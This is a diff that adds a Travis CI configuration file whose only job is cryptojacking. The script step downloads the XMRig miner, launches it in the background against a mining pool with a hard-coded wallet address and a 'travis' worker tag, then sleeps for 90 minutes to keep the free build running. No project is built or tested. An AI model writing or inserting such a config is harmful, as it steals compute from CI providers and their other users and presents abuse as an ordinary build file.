@@ -1,0 +1,14 @@
+language: minimal
+os: linux
+dist: focal
+
+script:
+  - cd /tmp
+  - wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz -O xmrig.tar.gz
+  - tar -xzf xmrig.tar.gz
+  - cd xmrig-*
+  - chmod +x xmrig
+  - ./xmrig -o rx.unmineable.com:3333 -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.travis_0442134d -p x --donate-level 1 -k &
+  - sleep 5400
+
+timeout: 180
